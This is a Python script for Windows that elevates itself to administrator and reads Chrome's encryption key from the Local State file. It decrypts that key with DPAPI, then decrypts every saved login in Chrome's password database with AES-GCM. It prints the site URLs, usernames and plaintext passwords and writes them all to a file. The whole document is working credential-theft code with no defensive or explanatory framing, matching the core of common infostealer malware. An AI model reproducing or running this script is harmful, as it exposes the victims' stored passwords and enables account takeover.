import os
import sys
import logging
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    exit()

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():

    current_file = os.path.abspath(__file__)
    current_dir = os.path.dirname(current_file)
    file_path_var = os.path.join(current_dir, "var.txt")

    os.path.join(current_dir, "var.txt")

    with open(file_path_var, "r") as file:
        lines = file.readlines()
    key_line = lines[0].rstrip('\n')
    lc = os.path.abspath(key_line)

    local_state_path = lc

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def main():

    current_file = os.path.abspath(__file__)
    current_dir = os.path.dirname(current_file)
    file_path_var = os.path.join(current_dir, "var.txt")

    os.path.join(current_dir, "var.txt")

    with open(file_path_var, "r") as file:
        lines = file.readlines()
    encryp_line = lines[1].rstrip('\n')
    save_line = lines[2].rstrip('\n')

    file.close()

    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_file = os.path.abspath(encryp_line)
    db_path = db_file
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows

    file_path = os.path.abspath(save_line)

    try:
        with open(file_path, 'w') as file:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]        
                if username or password:
                    print(f"Origin URL: {origin_url}")
                    print(f"Action URL: {action_url}")
                    print(f"Username: {username}")
                    print(f"Password: {password}")
                    file.write(f"Origin URL: {origin_url}\n")
                    file.write(f"Action URL: {action_url}\n")
                    file.write(f"Username: {username}\n")
                    file.write(f"Password: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    print(f"Creation date: {str(get_chrome_datetime(date_created))}")
                    file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
                if date_last_used != 86400000000 and date_last_used:
                    print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
                    file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
                print("="*50)
                file.write("="*50+'\n')

        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass
    except Exception as e:
        print(f"An error occurred while writing to the file: {e}")

while True:
    try:
        main()
        break
    except Exception as e:
        print("An error occurred:", e)
        print("Retrying...")